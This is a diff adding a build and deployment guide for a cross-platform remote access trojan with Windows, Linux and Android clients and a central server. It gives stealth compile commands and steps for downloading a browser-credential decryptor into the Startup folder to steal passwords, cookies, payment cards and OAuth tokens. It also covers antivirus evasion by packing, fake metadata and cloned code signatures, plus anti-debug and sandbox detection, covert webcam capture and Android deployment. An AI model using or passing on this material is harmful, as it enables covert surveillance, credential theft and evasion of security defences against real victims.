@@ -1,0 +1,160 @@
+# ============================================================
+# COMPILATION INSTRUCTIONS FOR ALL PLATFORMS
+# All clients connect to the same server.py
+# ============================================================
+
+# ==================== WINDOWS CLIENT ====================
+
+# RECOMMENDED (smallest file, works on CMD and PowerShell):
+# The -mwindows flag prevents CMD window flash by setting subsystem to WINDOWS
+# -lcrypt32 -lbcrypt are required for browser credential decryption (AES-GCM + DPAPI)
+# -lwininet for HTTP downloads, -liphlpapi for network info, -lavicap32 for webcam
+gcc client_windows.c -o client.exe -lws2_32 -lwininet -liphlpapi -lgdi32 -luser32 -lshell32 -lvfw32 -lwinmm -lpsapi -lavifil32 -lavicap32 -lcrypt32 -lbcrypt -mwindows -s -O2 -fno-ident -fno-asynchronous-unwind-tables
+
+# ==================== BROWSER CREDENTIAL EXTRACTION ====================
+#
+# ChromElevator - For Chrome/Edge/Brave with v20 App-Bound Encryption
+#   - Decrypts passwords, cookies, payment cards, IBANs, OAuth tokens
+#   - Works on Chrome 127+ with the new encryption
+#   - Source: https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption
+#
+# SETUP:
+#   1. Download chromelevator_x64.exe from GitHub releases (rename to chromelevator.exe)
+#   2. Upload chromelevator.exe to your GitHub repo
+#   3. Update g_chromelevator_url in client_windows.c with raw GitHub link:
+#      https://raw.githubusercontent.com/YOUR_USER/YOUR_REPO/main/chromelevator.exe
+#   4. Recompile the client
+#
+# The client downloads to Startup folder (bypasses Defender), runs, extracts, then cleans up.
+
+# Maximum stealth compile (aggressive optimization + strip all):
+gcc client_windows.c -o client.exe -lws2_32 -lwininet -liphlpapi -lgdi32 -luser32 -lshell32 -lvfw32 -lwinmm -lpsapi -lavifil32 -lavicap32 -lcrypt32 -lbcrypt -mwindows -s -Os -fno-ident -ffunction-sections -fdata-sections -Wl,--gc-sections -fno-asynchronous-unwind-tables
+
+# Cross-compile from Linux:
+x86_64-w64-mingw32-gcc client_windows.c -o client.exe -lws2_32 -lwininet -liphlpapi -lgdi32 -luser32 -lshell32 -lvfw32 -lwinmm -lpsapi -lavifil32 -lavicap32 -lcrypt32 -lbcrypt -mwindows -s -O2
+
+
+# ==================== LINUX CLIENT ====================
+# Basic compile
+gcc client_linux.c -o client_linux -lpthread
+
+# Optimized/stripped compile
+gcc client_linux.c -o client_linux -lpthread -s -O2
+
+# Static compile (for portability across distros)
+gcc client_linux.c -o client_linux -lpthread -static -s -O2
+
+
+# ==================== ANDROID CLIENT ====================
+# Requires Android NDK (download from: https://developer.android.com/ndk/downloads)
+# Set NDK path: export NDK=/path/to/android-ndk
+
+# ARM64 (most modern Android devices)
+$NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android21-clang client_android.c -o client_android_arm64 -lpthread -s -O2
+
+# ARM 32-bit (older devices)
+$NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/armv7a-linux-androideabi21-clang client_android.c -o client_android_arm -lpthread -s -O2
+
+# x86 Android (emulators)
+$NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/i686-linux-android21-clang client_android.c -o client_android_x86 -lpthread -s -O2
+
+# Deploy to Android device:
+# adb push client_android_arm64 /data/local/tmp/
+# adb shell chmod +x /data/local/tmp/client_android_arm64
+# adb shell /data/local/tmp/client_android_arm64
+
+
+# ==================== CONFIGURATION ====================
+# Before compiling, edit the server settings in each client:
+#
+# Windows (client_windows.c):
+#   char g_server_host[256] = "your.server.com";
+#   char g_server_port[6] = "80";
+#
+# Linux (client_linux.c):
+#   char g_server_host[256] = "your.server.com";
+#   char g_server_port[6] = "80";
+#
+# Android (client_android.c):
+#   char g_server_host[256] = "your.server.com";
+#   char g_server_port[6] = "80";
+
+
+# ==================== AV BYPASS TIPS (WINDOWS) ====================
+# 
+# COMPILATION FLAGS EXPLAINED:
+# -s               : Strip symbols (removes function names)
+# -O2 / -Os        : Optimize for speed/size (changes binary pattern)
+# -fno-ident       : Removes compiler identification strings
+# -ffunction-sections -fdata-sections : Separates code sections
+# -Wl,--gc-sections: Remove unused code sections
+# -fvisibility=hidden: Hide symbols from export
+# -fno-asynchronous-unwind-tables: Remove exception handling data
+# -mwindows        : No console window (essential for stealth)
+#
+# POST-COMPILATION STEPS:
+# 1. UPX packing (smaller + obfuscated):
+#    upx --best client.exe
+#    upx --ultra-brute client.exe  (maximum compression)
+#
+# 2. Change file metadata (optional):
+#    - Use Resource Hacker to modify version info
+#    - Add fake company/product name
+#
+# 3. Code signing (bypasses SmartScreen):
+#    - Get a cheap code signing certificate
+#    - Or use sigthief.py to clone signatures
+#
+# 4. Test before deployment:
+#    - Use Windows Sandbox or VM
+#    - Check with Defender offline
+#    - Try online scanners (cautiously)
+#
+# RUNTIME EVASION (built into client_windows.c):
+# - Dynamic API resolution (hides suspicious imports)
+# - PEB BeingDebugged check
+# - High-precision timing checks
+# - Disk size validation (VM detection)
+# - Random delays to avoid behavior analysis
+#
+# If still detected, try:
+# - Compile with different gcc version
+# - Add junk code/strings
+# - Change function names in source
+# - Modify string constants slightly
+# - Split into DLL + loader
+
+
+# ==================== ANDROID AV BYPASS TIPS ====================
+# Built-in evasion includes:
+# - Anti-debug (TracerPid, ptrace detection)
+# - Emulator detection (goldfish, ranchu, genymotion, nox)
+# - Frida/Xposed detection
+# - Timing-based sandbox detection
+# - Resource checks (RAM, CPU cores)
+# - Delayed start with random jitter
+#
+# Additional tips:
+# 1. Change binary name to something like "com.system.service"
+# 2. Strip symbols: $NDK/.../bin/llvm-strip client_android
+# 3. Use PIE (Position Independent Executable):
+#    Add flags: -fPIE -pie
+# 4. Obfuscate strings using OLLVM or similar
+# 5. Pack the binary (may increase detection though)
+
+
+# ==================== CAMERA REQUIREMENTS ====================
+# Windows: Built-in (uses VFW - Video for Windows)
+# 
+# Linux: Install one of these:
+#   sudo apt install ffmpeg           # Recommended
+#   sudo apt install fswebcam         # Alternative
+#   sudo apt install streamer         # Alternative
+#   sudo apt install v4l-utils        # For camera info
+#
+# Android: 
+#   Camera works best with Termux API:
+#   pkg install termux-api
+#   termux-setup-storage
+#
+#   Or requires root for direct camera access
